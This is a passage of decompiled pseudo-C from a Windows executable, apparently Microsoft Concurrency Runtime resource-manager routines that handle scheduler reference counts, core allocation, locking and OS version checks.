          v50 = v17;
          v58 = 0;
          do
          {
            v51 = Blocka[v32];
            v56 = *(_DWORD **)(v51 + 16);
            v62 = *(_DWORD *)(v51 + 4);
            if ( v62 <= sub_431117(v56) )
            {
              v17 = v50;
              v34 = v68;
            }
            else
            {
              v33 = (double)sub_431117(v56);
              v34 = 1;
              v35 = v33 / (double)v62;
              v68 = 1;
              v36 = *(double *)(v51 + 32);
              v50 = v50 - (1.0 - v35) * v36;
              v37 = v35 * v36;
              v17 = v50;
              *(double *)(v51 + 32) = v37;
            }
            v32 = v58 + 1;
            v58 = v32;
          }
          while ( v32 < v8 );
          v20 = v49;
          if ( !v34 )
          {
            v38 = 0;
            v50 = v17;
            v57 = 0;
            do
            {
              v63 = Blocka[v38];
              v39 = *(_DWORD **)(v63 + 16);
              v59 = v39[46];
              if ( v59 + sub_432E07(v39) <= *(_DWORD *)(v63 + 4) )
              {
                v17 = v50;
                v41 = v68;
              }
              else
              {
                v40 = (double)(v59 + sub_432E07(*(_DWORD **)(v63 + 16)));
                v41 = 1;
                v42 = v40 / v48;
                v68 = 1;
                v50 = v42 - *(double *)(v63 + 32) + v50;
                v43 = v42;
                v17 = v50;
                *(double *)(v63 + 32) = v43;
              }
              v38 = v57 + 1;
              v57 = v38;
            }
            while ( v38 < v8 );
            v20 = v49;
            if ( !v41 )
              break;
          }
        }
      }
      if ( *(_DWORD *)(*Blocka + 4) > a3 )
      {
        do
        {
          v44 = Blocka[v13];
          v45 = *(_DWORD **)(v44 + 16);
          v46 = v45[40] - *(_DWORD *)(v44 + 4) - v45[42];
          if ( v46 )
            sub_433960(this, a2, v45, v46);
          ++v13;
        }
        while ( v13 < v8 );
        v52 = sub_433C40(this, a2, *(_DWORD *)(*Blocka + 4) - a3, 0);
      }
      j_j_j___free_base(Blocka);
    }
  }
  return v52;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (00433812) --------------------------------------------------------
signed __int32 __thiscall sub_433812(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 1);
}

//----- (0043381C) --------------------------------------------------------
char *__thiscall sub_43381C(void *this, int a2, int a3)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "pScheduler");
LABEL_6:
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( a3 != 0x10000 )
  {
    sub_429626((std::exception *)pExceptionObject, "version");
    goto LABEL_6;
  }
  return sub_430FBE(this, a2);
}

//----- (00433860) --------------------------------------------------------
signed __int32 __thiscall sub_433860(int this)
{
  signed __int32 v2; // ebx

  v2 = _InterlockedDecrement((volatile signed __int32 *)(this + 4));
  if ( !v2 )
  {
    sub_4304E3(&dword_492820);
    dword_4927B8 = sub_430237(dword_4927B8) != this ? dword_4927B8 : 0;
    dword_492820 = 0;
    if ( *(_DWORD *)(this + 76) )
    {
      sub_42E75B((LPCRITICAL_SECTION)(this + 44));
      *(_DWORD *)(this + 40) = 2;
      sub_42E8A1((LPCRITICAL_SECTION)(this + 44));
      SetEvent(*(HANDLE *)(this + 80));
      sub_4301E2(*(HANDLE *)(this + 76), 0xFFFFFFFF);
    }
    sub_43082E((char *)this);
    sub_42CF7C((void *)this);
  }
  return v2;
}
// 4927B8: using guessed type int dword_4927B8;
// 492820: using guessed type int dword_492820;

//----- (0043390B) --------------------------------------------------------
unsigned int __thiscall sub_43390B(_DWORD *this, int a2, unsigned int a3, int a4)
{
  unsigned int v5; // edi
  int v6; // ebx
  bool v7; // zf

  v5 = 1;
  v6 = 0;
  if ( this[2] > 1u )
  {
    do
    {
      if ( sub_433960(this, a2, *(_DWORD **)(*(_DWORD *)(this[21] + 4 * v5) + 16), a4) )
        LOBYTE(v6) = 1;
      ++v5;
    }
    while ( v5 < this[2] );
    v7 = (_BYTE)v6 == 0;
    v6 = 0;
    if ( !v7 )
      return sub_433C40(this, a2, a3, 0);
  }
  return v6;
}

//----- (00433960) --------------------------------------------------------
char __thiscall sub_433960(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  int v4; // edx
  int v5; // eax
  unsigned int v6; // eax
  int v7; // ebx
  int v8; // edi
  unsigned int v9; // eax
  _DWORD *v10; // ecx
  unsigned int v11; // eax
  int v12; // edi
  int v14; // [esp+Ch] [ebp-18h]
  int v15; // [esp+10h] [ebp-14h]
  _DWORD *v16; // [esp+14h] [ebp-10h]
  unsigned int v17; // [esp+18h] [ebp-Ch]
  int v18; // [esp+1Ch] [ebp-8h]
  int v19; // [esp+20h] [ebp-4h]

  v4 = a4;
  v16 = this;
  if ( a4 == -2 )
  {
    v5 = a3[42];
    v4 = v5;
  }
  else
  {
    if ( a4 == -1 )
    {
      v6 = sub_432E07(a3);
      this = v16;
      v4 = a3[40] - a3[27] - (a3[46] + v6);
    }
    v5 = 0;
  }
  v7 = v4 - v5;
  if ( !v4 )
    return 0;
  v8 = a3[4];
  v14 = v8;
  v15 = *(_DWORD *)(a2 + 20);
  v9 = 0;
  v17 = 0;
  if ( !this[6] )
    return 0;
  while ( 1 )
  {
    v10 = (_DWORD *)(v8 + 52 * *(_DWORD *)(v15 + 4 * v9));
    if ( v10[7] != v10[9] )
    {
      v11 = 0;
      v18 = 0;
      if ( v10[1] )
        break;
    }
LABEL_21:
    v9 = v17 + 1;
    v17 = v9;
    if ( v9 >= v16[6] )
      return 0;
  }
  v19 = 0;
  while ( 1 )
  {
    v12 = v19 + v10[12];
    if ( *(_DWORD *)v12 != 4 || *(_DWORD *)(v12 + 40) || !*(_BYTE *)(v12 + 49) && !v7 )
      goto LABEL_19;
    *(_DWORD *)v12 = 5;
    ++a3[27];
    --**(_DWORD **)(v12 + 20);
    if ( !*(_BYTE *)(v12 + 49) )
      --v7;
    if ( !--v4 )
      return 1;
    v11 = v18;
LABEL_19:
    v19 += 52;
    v18 = ++v11;
    if ( v11 >= v10[1] )
    {
      v8 = v14;
      goto LABEL_21;
    }
  }
}

//----- (00433A4A) --------------------------------------------------------
int __thiscall sub_433A4A(_DWORD *this, int a2)
{
  int result; // eax

  --*this;
  *(_DWORD *)(*(_DWORD *)(a2 + 24) + 28) = *(_DWORD *)(a2 + 28);
  *(_DWORD *)(*(_DWORD *)(a2 + 28) + 24) = *(_DWORD *)(a2 + 24);
  result = this[1];
  if ( a2 == result )
  {
    if ( result == *(_DWORD *)(result + 24) )
      result = 0;
    else
      result = *(_DWORD *)(result + 28);
    this[1] = result;
  }
  return result;
}

//----- (00433A80) --------------------------------------------------------
void __thiscall sub_433A80(int this, DWORD_PTR *Block)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  _DWORD *v4; // edi
  bool v5; // [esp+14h] [ebp-10h]

  v5 = 0;
  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  sub_42E75B((LPCRITICAL_SECTION)(this + 44));
  v4 = (_DWORD *)Block[5];
  sub_43A61C(Block);
  if ( v4[40] < sub_431117(v4) && *(_DWORD *)(this + 8) == 1 )
    v5 = !sub_4314EA((_DWORD *)this);
  sub_42E8A1(v3);
  if ( v5 )
    SetEvent(*(HANDLE *)(this + 80));
}

//----- (00433AF7) --------------------------------------------------------
_DWORD *__thiscall sub_433AF7(int this, _DWORD *a2, char a3)
{
  struct _RTL_CRITICAL_SECTION *v4; // esi
  _DWORD *v5; // eax
  char v6; // bl
  bool v8; // [esp+14h] [ebp-14h]
  _DWORD *v9; // [esp+18h] [ebp-10h]

  v4 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  v9 = 0;
  v8 = 0;
  sub_42E75B((LPCRITICAL_SECTION)(this + 44));
  if ( a3 )
  {
    v9 = sub_43BBEA(a2);
    v8 = v9 == 0;
  }
  if ( a2[33] == a2[32] )
    ++*(_DWORD *)(this + 16);
  ++*(_DWORD *)(this + 8);
  sub_4309F3((_DWORD *)(this + 96), (int)a2);
  v5 = sub_432E20((unsigned int *)this, a2, 1, v8);
  if ( !v9 )
    v9 = v5;
  if ( a2[33] == a2[32] )
    sub_434137((_DWORD *)this, a2);
  if ( *(_DWORD *)(this + 8) == 2 )
  {
    v6 = 0;
    *(_DWORD *)(this + 40) = 1;
    if ( !*(_DWORD *)(this + 76) )
    {
      *(_DWORD *)(this + 76) = 1;
      *(_DWORD *)(this + 88) = unknown_libname_45(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
      *(_DWORD *)(this + 92) = unknown_libname_45(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
      v6 = 1;
    }
    sub_42E8A1(v4);
    SetEvent(*(HANDLE *)(this + 80));
    if ( v6 )
      sub_430F57((LPVOID)this);
  }
  else
  {
    sub_42E8A1(v4);
  }
  return v9;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (00433C0C) --------------------------------------------------------
unsigned int __thiscall sub_433C0C(_DWORD *this, int a2, unsigned int a3)
{
  int v3; // edi
  unsigned int i; // esi
  unsigned int v5; // eax
  _DWORD *v7; // [esp+8h] [ebp-4h]

  v3 = 0;
  v7 = this;
  for ( i = 0; i < a3; i += v5 )
  {
    v5 = sub_433C40(this, a2, a3 - i, ++v3);
    this = v7;
  }
  return i;
}

//----- (00433C40) --------------------------------------------------------
unsigned int __thiscall sub_433C40(_DWORD *this, int a2, unsigned int a3, int a4)
{
  char v5; // al
  int v6; // esi
  unsigned int v7; // ebx
  unsigned int v8; // edx
  _DWORD *v9; // ecx
  unsigned int v10; // edi
  int v11; // esi
  int v12; // edx
  int v13; // ecx
  unsigned int v14; // edi
  _DWORD *v15; // eax
  unsigned int v16; // ecx
  _DWORD *v17; // edx
  unsigned int v18; // ebx
  unsigned int v19; // esi
  _DWORD *v20; // ecx
  unsigned int v21; // eax
  unsigned int v22; // ecx
  int v23; // edx
  int v24; // eax
  unsigned int v25; // edi
  int v26; // ebx
  int v27; // eax
  int v28; // ecx
  unsigned int v30; // [esp+Ch] [ebp-24h]
  unsigned int v31; // [esp+10h] [ebp-20h]
  int v32; // [esp+10h] [ebp-20h]
  int v33; // [esp+14h] [ebp-1Ch]
  int v35; // [esp+1Ch] [ebp-14h]
  int v36; // [esp+20h] [ebp-10h]
  unsigned int v37; // [esp+24h] [ebp-Ch]
  unsigned int v38; // [esp+28h] [ebp-8h]
  char v39; // [esp+2Fh] [ebp-1h]

  v33 = -1;
  if ( *(_BYTE *)(a2 + 104) )
    v33 = sub_4324A8(this, 0);
  v5 = 0;
  v6 = *(_DWORD *)(a2 + 20);
  v7 = 0;
  v8 = this[6];
  v36 = *(_DWORD *)(a2 + 16);
  v35 = v6;
  v39 = 0;
  v31 = 0;
  if ( v8 )
  {
    v9 = (_DWORD *)(*(_DWORD *)(a2 + 16) + 8);
    do
    {
      v10 = 0;
      if ( *(v9 - 1) )
      {
        v11 = 0;
        do
        {
          v12 = v9[10];
          if ( *(_DWORD *)(v12 + v11) == 1 )
          {
            if ( a4 == **(_DWORD **)(v12 + v11 + 20) )
            {
              v5 = 1;
              *(_DWORD *)(v12 + v11) = 2;
              ++*v9;
              v39 = 1;
            }
            else
            {
              v5 = v39;
            }
          }
          ++v10;
          v11 += 52;
        }
        while ( v10 < *(v9 - 1) );
        v7 = v31;
      }
      ++v7;
      v9 += 13;
      v31 = v7;
      v8 = this[6];
    }
    while ( v7 < v8 );
    v6 = v35;
  }
  v13 = 0;
  v37 = 0;
  if ( v5 )
  {
    v14 = 0;
    v32 = 0;
    if ( v8 )
    {
      v15 = this;
      do
      {
        v16 = v14;
        v38 = v14;
        v17 = (_DWORD *)(v36 + 52 * *(_DWORD *)(v6 + 4 * v14));
        v18 = a3 - v37;
        if ( a3 != v37 )
        {
          if ( v17[2] > v18 )
            v17[2] = v18;
          v19 = v14 + 1;
          if ( v14 + 1 < v15[6] )
          {
            while ( 1 )
            {
              v20 = (_DWORD *)(v36 + 52 * *(_DWORD *)(v35 + 4 * v19));
              v30 = v20[2];
              if ( v30 > v18 )
              {
                v20[2] = v18;
                v30 = a3 - v37;
              }
              v21 = v30 + v20[6] + v20[7];
              v22 = v17[2] + v17[6] + v17[7];
              if ( v22 >= v21 )
              {
                if ( v22 != v21 || !*(_BYTE *)(a2 + 104) || (v24 = *(_DWORD *)(v35 + 4 * v19), v24 != v33) )
                {
                  v16 = v38;
                  goto LABEL_32;
                }
                v23 = 52 * v24;
              }
              else
              {
                v23 = 52 * *(_DWORD *)(v35 + 4 * v19);
              }
              v17 = (_DWORD *)(v36 + v23);
              v16 = v19;
              v38 = v19;
LABEL_32:
              if ( ++v19 >= this[6] )
              {
                v14 = v32;
                break;
              }
            }
          }
          v6 = v35;
        }
        if ( v17[2] )
        {
          if ( v17[1] )
          {
            v25 = 0;
            v26 = 0;
            do
            {
              v27 = v26 + v17[12];
              if ( *(_DWORD *)v27 == 2 )
              {
                v16 = v38;
                if ( v37 >= a3 )
                {
                  *(_DWORD *)v27 = 1;
                }
                else
                {
                  *(_DWORD *)v27 = 3;
                  ++**(_DWORD **)(v27 + 20);
                  ++v17[6];
                  if ( *(_BYTE *)(a2 + 104) && *(_DWORD *)(v6 + 4 * v38) == v33 )
                    *(_BYTE *)(a2 + 104) = 0;
                  ++v37;
                }
              }
              ++v25;
              v26 += 52;
            }
            while ( v25 < v17[1] );
            v14 = v32;
          }
          v17[2] = 0;
        }
        if ( v14 != v16 )
        {
          v28 = *(_DWORD *)(v6 + 4 * v14);
          *(_DWORD *)(v6 + 4 * v14) = *(_DWORD *)(v6 + 4 * v38);
          *(_DWORD *)(v6 + 4 * v38) = v28;
        }
        v15 = this;
        v32 = ++v14;
      }
      while ( v14 < this[6] );
      return v37;
    }
  }
  return v13;
}

//----- (00433E1B) --------------------------------------------------------
int __thiscall sub_433E1B(_DWORD *this)
{
  _DWORD *v1; // esi
  __int64 v2; // rax
  int v3; // edi
  _DWORD *v4; // ecx
  int v5; // ebx
  unsigned int v6; // esi
  _DWORD *v7; // eax

  v1 = this;
  v2 = 0i64;
  if ( this[6] )
  {
    v3 = 0;
    do
    {
      v4 = (_DWORD *)(v3 + v1[18]);
      v4[2] = 0;
      v4[7] = 0;
      if ( v4[1] )
      {
        v5 = 0;
        v6 = 0;
        do
        {
          v7 = (_DWORD *)(v5 + v4[8]);
          v5 += 36;
          *v7 = 0;
          v7[7] = 0;
          ++v6;
        }
        while ( v6 < v4[1] );
        v1 = this;
        LODWORD(v2) = 0;
      }
      ++HIDWORD(v2);
      v3 += 40;
    }
    while ( HIDWORD(v2) < v1[6] );
  }
  return v2;
}

//----- (00433E72) --------------------------------------------------------
__int32 sub_433E72()
{
  __int32 result; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-124h] BYREF
  struct _OSVERSIONINFOW VersionInformation; // [esp+Ch] [ebp-118h] BYREF

  VersionInformation.dwOSVersionInfoSize = 276;
  if ( !GetVersionExW(&VersionInformation) )
  {
LABEL_20:
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVunsupported_os_Concurrency__);
  }
  if ( VersionInformation.dwMajorVersion != 5 )
  {
    if ( VersionInformation.dwMajorVersion != 6 )
      goto LABEL_9;
    result = VersionInformation.dwMinorVersion;
    if ( !VersionInformation.dwMinorVersion )
    {
      dword_4927DC = 3;
      return result;
    }
    if ( VersionInformation.dwMinorVersion == 1 )
      dword_4927DC = 4;
    else
LABEL_9:
      dword_4927DC = 6;
    goto LABEL_17;
  }
  if ( !VersionInformation.dwMinorVersion )
  {
    dword_4927DC = 0;
    goto LABEL_20;
  }
  if ( VersionInformation.dwMinorVersion == 1 )
  {
    result = 1;
    dword_4927DC = 1;
  }
  else
  {
    result = VersionInformation.dwMinorVersion - 2;
    if ( VersionInformation.dwMinorVersion == 2 )
    {
      dword_4927DC = 2;
      return result;
    }
    result = dword_4927DC;
  }
  if ( result >= 4 )
  {
LABEL_17:
    result = sub_42FC8F();
    if ( dword_4927DC >= 6 )
      return sub_43BF61();
  }
  return result;
}
// 4927DC: using guessed type int dword_4927DC;

//----- (00433F60) --------------------------------------------------------
void __cdecl sub_433F60(int a1, unsigned int a2)
{
  unsigned int v2; // edx
  double v3; // st6
  double v4; // st5
  unsigned int v5; // esi
  int v6; // ecx
  unsigned int v7; // esi
  unsigned int v8; // eax
  unsigned int v9; // edx
  int v10; // esi
  unsigned int v11; // eax
  int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // esi
  double v15; // st4
  double v16; // rt0
  double v17; // rt1
  double v18; // st4
  double v19; // st6
  double v20; // rt2
  double v21; // st4
  double v22; // st5
  double v23; // rtt
  double v24; // st3
  unsigned int v25; // eax
  unsigned int v26; // esi
  int v27; // edx
  unsigned int v28; // eax
  double v29; // rt2
  int v30; // eax
  double v31; // rtt
  double v32; // st4
  double v33; // rt0
  int v34; // ecx
  unsigned int v35; // [esp+Ch] [ebp-14h]
  unsigned int v36; // [esp+14h] [ebp-Ch]
  unsigned int v37; // [esp+14h] [ebp-Ch]
  unsigned int v38; // [esp+18h] [ebp-8h]
  unsigned int v39; // [esp+1Ch] [ebp-4h]
  unsigned int v40; // [esp+1Ch] [ebp-4h]
  unsigned int v41; // [esp+1Ch] [ebp-4h]

  v2 = 0;
  v3 = 0.0;
  v4 = 0.0000001;
  v35 = 0;
  v5 = 0;
  v39 = 0;
  if ( a2 )
  {
    do
    {
      *(_DWORD *)(*(_DWORD *)(a1 + 4 * v5) + 4) = (unsigned __int64)*(double *)(*(_DWORD *)(a1 + 4 * v5) + 8);
      v6 = *(_DWORD *)(a1 + 4 * v39);
      v5 = v39 + 1;
      v39 = v5;
      *(double *)(v6 + 8) = *(double *)(v6 + 8) - (double)*(unsigned int *)(v6 + 4);
    }
    while ( v5 < a2 );
    v7 = 0;
    v36 = 0;
    do
    {
      v8 = v7 + 1;
      v40 = v7;
      v38 = v7 + 1;
      v9 = v7 + 1;
      if ( v7 + 1 < a2 )
      {
        v10 = 4 * v7;
        do
        {
          if ( *(double *)(*(_DWORD *)(v10 + a1) + 8) + 0.0000001 >= *(double *)(*(_DWORD *)(a1 + 4 * v9) + 8) )
          {
            v11 = v40;
          }
          else
          {
            v11 = v9;
            v40 = v9;
            v10 = 4 * v9;
          }
          ++v9;
        }
        while ( v9 < a2 );
        if ( v36 != v11 )
        {
          v12 = *(_DWORD *)(a1 + 4 * v36);
          *(_DWORD *)(a1 + 4 * v36) = *(_DWORD *)(a1 + 4 * v11);
          *(_DWORD *)(a1 + 4 * v40) = v12;
        }
        v8 = v38;
      }
      v7 = v8;
      v36 = v8;
    }
    while ( v8 < a2 );
    v2 = 0;
  }
  v13 = a2 - 1;
  v14 = 0;
  if ( a2 )
  {
    v15 = 1.0;
    while ( 1 )
    {
      v17 = v15;
      v18 = v3;
      v19 = v17;
      while ( v18 > v4 )
      {
        v20 = v18;
        v21 = v4;
        v22 = v20;
        if ( v21 < *(double *)(*(_DWORD *)(a1 + 4 * v13) + 8) )
        {
          while ( 1 )
          {
            v30 = *(_DWORD *)(a1 + 4 * v13);
            v31 = v21;
            v32 = v22;
            v4 = v31;
            --v13;
            v33 = v32 - *(double *)(v30 + 8);
            *(double *)(v30 + 8) = 0.0;
            v18 = v33;
            if ( v33 <= v31 )
              break;
            v29 = v18;
            v21 = v4;
            v22 = v29;
          }
        }
        else
        {
          --v13;
          v23 = v21;
          v18 = v22;
          v4 = v23;
        }
      }
      if ( v14 > v13 )
        break;
      v24 = *(double *)(*(_DWORD *)(a1 + 4 * v14) + 8);
      if ( v24 > v4 )
      {
        *(double *)(*(_DWORD *)(a1 + 4 * v14) + 8) = 0.0;
        v18 = v18 + v19 - v24;
        ++*(_DWORD *)(*(_DWORD *)(a1 + 4 * v14) + 4);
      }
      if ( ++v14 >= a2 )
        break;
      v16 = v18;
      v15 = v19;
      v3 = v16;
    }
  }
  if ( a2 )
  {
    do
    {
      v25 = v2 + 1;
      v41 = v2;
      v37 = v2 + 1;
      v26 = v2 + 1;
      if ( v2 + 1 < a2 )
      {
        v27 = 4 * v2;
        do
        {
          if ( **(_DWORD **)(a1 + 4 * v26) >= **(_DWORD **)(v27 + a1) )
          {
            v28 = v41;
          }
          else
          {
            v28 = v26;
            v41 = v26;
            v27 = 4 * v26;
          }
          ++v26;
        }
        while ( v26 < a2 );
        if ( v35 != v28 )
        {
          v34 = *(_DWORD *)(a1 + 4 * v35);
          *(_DWORD *)(a1 + 4 * v35) = *(_DWORD *)(a1 + 4 * v28);
          *(_DWORD *)(a1 + 4 * v41) = v34;
        }
        v25 = v37;
      }
      v2 = v25;
      v35 = v25;
    }
    while ( v25 < a2 );
  }
}

//----- (00434118) --------------------------------------------------------
char __thiscall sub_434118(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // esi
  signed __int32 v2; // edx

  v1 = this + 1;
  while ( *v1 )
  {
    v2 = *v1;
    if ( _InterlockedCompareExchange(v1, v2 + 1, v2) == v2 )
      return 1;
  }
  return 0;
}

//----- (00434137) --------------------------------------------------------
void __thiscall sub_434137(_DWORD *this, _DWORD *a2)
{
  unsigned int v3; // ecx
  int v4; // edx
  int v5; // ebx
  int v6; // eax
  int v7; // edi
  unsigned int v8; // ecx
  int v9; // edx
  int v10; // eax
  int v11; // eax
  int v12; // edi
  _DWORD *v13; // ecx
  int v14; // eax
  unsigned int v15; // ecx
  int v16; // edi
  int v17; // ebx
  unsigned int v18; // edx
  int v19; // eax
  int v20; // ecx
  int v21; // eax
  int v22; // edi
  _DWORD *v23; // edi
  _DWORD *v24; // ecx
  bool v25; // zf
  unsigned int v26; // [esp+4h] [ebp-20h]
  int v27; // [esp+8h] [ebp-1Ch]
  int v28; // [esp+Ch] [ebp-18h]
  unsigned int v29; // [esp+Ch] [ebp-18h]
  unsigned int v30; // [esp+10h] [ebp-14h]
  int v31; // [esp+10h] [ebp-14h]
  int v32; // [esp+14h] [ebp-10h]
  unsigned int v33; // [esp+14h] [ebp-10h]
  int v34; // [esp+18h] [ebp-Ch]
  int v35; // [esp+18h] [ebp-Ch]
  int v36; // [esp+1Ch] [ebp-8h]
  int v37; // [esp+1Ch] [ebp-8h]
  unsigned int v38; // [esp+20h] [ebp-4h]
  unsigned int v39; // [esp+20h] [ebp-4h]

  v3 = 0;
  v30 = 0;
  if ( this[6] )
  {
    v4 = 0;
    v5 = 0;
    v32 = 0;
    v28 = 0;
    do
    {
      v38 = 0;
      v6 = v5 + this[18];
      if ( *(_DWORD *)(v6 + 4) )
      {
        v34 = 0;
        v7 = 0;
        v8 = 0;
        v36 = 0;
        do
        {
          v9 = v7 + *(_DWORD *)(v6 + 32);
          v10 = *(_DWORD *)(v9 + 20);
          *(_DWORD *)(v9 + 20) = 0;
          *(_DWORD *)(v9 + 24) = v10;
          v11 = this[25];
          if ( v11 )
          {
            v12 = *(_DWORD *)(v11 + 24);
            if ( v12 )
            {
              do
              {
                v13 = (_DWORD *)(v34 + *(_DWORD *)(v32 + *(_DWORD *)(v12 + 16) + 48));
                v13[8] = v13[7];
                v14 = v13[6];
                v13[7] = v14;
                *(_DWORD *)(v9 + 20) += v14;
                if ( v12 == this[25] )
                  break;
                v12 = *(_DWORD *)(v12 + 24);
              }
              while ( v12 );
              v5 = v28;
              v8 = v38;
            }
            v7 = v36;
          }
          ++v8;
          v34 += 52;
          v6 = v5 + this[18];
          v7 += 36;
          v38 = v8;
          v36 = v7;
        }
        while ( v8 < *(_DWORD *)(v6 + 4) );
        v3 = v30;
        v4 = v32;
      }
      ++v3;
      v5 += 40;
      v4 += 52;
      v30 = v3;
      v28 = v5;
      v32 = v4;
    }
    while ( v3 < this[6] );
    v15 = 0;
    v39 = 0;
    if ( this[6] )
    {
      v16 = 0;
      v17 = 0;
      v37 = 0;
      v27 = 0;
      do
      {
        v18 = 0;
        v19 = v17 + this[18];
        v29 = 0;
        if ( *(_DWORD *)(v19 + 4) )
        {
          v35 = 0;
          v20 = 0;
          v31 = 0;
          do
          {
            v21 = *(_DWORD *)(v19 + 32);
            v26 = *(_DWORD *)(v21 + v20 + 24);
            v22 = this[25];
            v33 = *(_DWORD *)(v21 + v20 + 20);
            if ( v22 )
            {
              v23 = *(_DWORD **)(v22 + 24);
              if ( v23 )
              {
                while ( 1 )
                {
                  if ( v23[33] == v23[32] )
                  {
                    v24 = (_DWORD *)(*(_DWORD *)(v37 + v23[4] + 48) + v35);
                    if ( v24[9] )
                    {
                      if ( v23 == a2 )
                      {
                        sub_43BDF7((int)v23, (int)v24, v33 > v24[7]);
                      }
                      else
                      {
                        if ( v26 != v24[8] )
                        {
                          v25 = v33 == v24[7];
LABEL_28:
                          if ( v25 && v26 > v24[8] )
                            sub_43BDF7((int)v23, (int)v24, 0);
                          goto LABEL_31;
                        }
                        v25 = v33 == v24[7];
                        if ( v33 <= v24[7] )
                          goto LABEL_28;
                        sub_43BDF7((int)v23, (int)v24, 1);
                      }
                    }
                  }
LABEL_31:
                  if ( v23 != (_DWORD *)this[25] )
                  {
                    v23 = (_DWORD *)v23[6];
                    if ( v23 )
                      continue;
                  }
                  v17 = v27;
                  v18 = v29;
                  v20 = v31;
                  break;
                }
              }
            }
            ++v18;
            v35 += 52;
            v19 = v17 + this[18];
            v20 += 36;
            v29 = v18;
            v31 = v20;
          }
          while ( v18 < *(_DWORD *)(v19 + 4) );
          v15 = v39;
          v16 = v37;
        }
        ++v15;
        v17 += 40;
        v16 += 52;
        v39 = v15;
        v27 = v17;
        v37 = v16;
      }
      while ( v15 < this[6] );
    }
  }
}

//----- (00434303) --------------------------------------------------------
_DWORD *__thiscall sub_434303(_DWORD *this, int a2, char a3)
{
  _DWORD *result; // eax
  int v5; // edi
  int v6; // edi
  int v7; // [esp+10h] [ebp-4h]

  sub_432AB0((int)this);
  memset((void *)(a2 + 64), 0, 0x30u);
  sub_432F76(this, 0, a2, a2 + 64);
  *(double *)(a2 + 96) = (double)sub_431117((_DWORD *)a2);
  *(_BYTE *)(a2 + 104) = a3;
  result = (_DWORD *)this[21];
  v7 = 1;
  *result = a2 + 64;
  v5 = this[25];
  if ( v5 )
  {
    v6 = *(_DWORD *)(v5 + 24);
    if ( v6 )
    {
      do
      {
        if ( v6 != a2 )
        {
          memset((void *)(v6 + 64), 0, 0x30u);
          sub_432F76(this, v7, v6, v6 + 64);
          *(double *)(v6 + 96) = (double)sub_431117((_DWORD *)v6);
          result = (_DWORD *)this[21];
          result[v7++] = v6 + 64;
        }
        if ( v6 == this[25] )
          break;
        result = *(_DWORD **)(v6 + 24);
        v6 = (int)result;
      }
      while ( result );
    }
  }
  return result;
}

//----- (004343C7) --------------------------------------------------------
int __thiscall sub_4343C7(int this, _DWORD *a2)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  unsigned int v4; // edx
  unsigned int *v5; // ecx
  unsigned int v6; // eax
  int v7; // edx
  unsigned int v8; // esi
  unsigned int v10; // [esp+10h] [ebp-14h]
  int v11; // [esp+10h] [ebp-14h]
  unsigned int v12; // [esp+14h] [ebp-10h]

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  sub_42E75B((LPCRITICAL_SECTION)(this + 44));
  sub_433A4A((_DWORD *)(this + 96), (int)a2);
  v4 = 0;
  v10 = 0;
  if ( *(_DWORD *)(this + 24) )
  {
    v5 = (unsigned int *)(a2[4] + 4);
    do
    {
      if ( v5[6] )
      {
        v6 = 0;
        v12 = 0;
        if ( *v5 )
        {
          v7 = 0;
          do
          {
            v8 = v5[11];
            if ( *(_DWORD *)(v8 + v7) == 4 )
            {
              --**(_DWORD **)(v8 + v7 + 20);
              v6 = v12;
            }
            ++v6;
            v7 += 52;
            v12 = v6;
          }
          while ( v6 < *v5 );
          v4 = v10;
        }
      }
      ++v4;
      v5 += 13;
      v10 = v4;
    }
    while ( v4 < *(_DWORD *)(this + 24) );
    v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  }
  if ( a2[33] == a2[32] )
    --*(_DWORD *)(this + 16);
  v11 = *(_DWORD *)(this + 8) - 1;
  *(_DWORD *)(this + 8) = v11;
  if ( v11 == 1 )
    *(_DWORD *)(this + 40) = 0;
  sub_42E8A1(v3);
  if ( v11 == 1 )
    SetEvent(*(HANDLE *)(this + 80));
  return (*(int (__thiscall **)(_DWORD *))(*a2 + 32))(a2);
}

//----- (00434499) --------------------------------------------------------
_DWORD *__thiscall sub_434499(int this, _DWORD *a2)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  _DWORD *v4; // edi

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  sub_42E75B((LPCRITICAL_SECTION)(this + 44));
  v4 = sub_43BBEA(a2);
  if ( !v4 )
    v4 = sub_432E20((unsigned int *)this, a2, 0, 1);
  sub_42E8A1(v3);
  return v4;
}

//----- (004344ED) --------------------------------------------------------
_DWORD *__thiscall sub_4344ED(_DWORD *this, int a2, int a3, _DWORD *a4, _DWORD *a5, _DWORD *a6)
{
  _DWORD *result; // eax

  result = a6;
  if ( *(_BYTE *)(a3 + 48) )
  {
    *(_BYTE *)(a3 + 48) = 0;
    --a6[5];
    --*(_DWORD *)(a2 + 40);
    if ( *(_BYTE *)(a3 + 49) )
    {
      --a6[6];
      --*(_DWORD *)(a2 + 44);
    }
    if ( *a5 == 6 )
    {
      result = a4;
      *a5 = 0;
      --a4[7];
      --this[8];
    }
    --a5[7];
  }
  else
  {
    *(_BYTE *)(a3 + 48) = 1;
    ++a6[5];
    ++*(_DWORD *)(a2 + 40);
    if ( *(_BYTE *)(a3 + 49) )
    {
      ++a6[6];
      ++*(_DWORD *)(a2 + 44);
    }
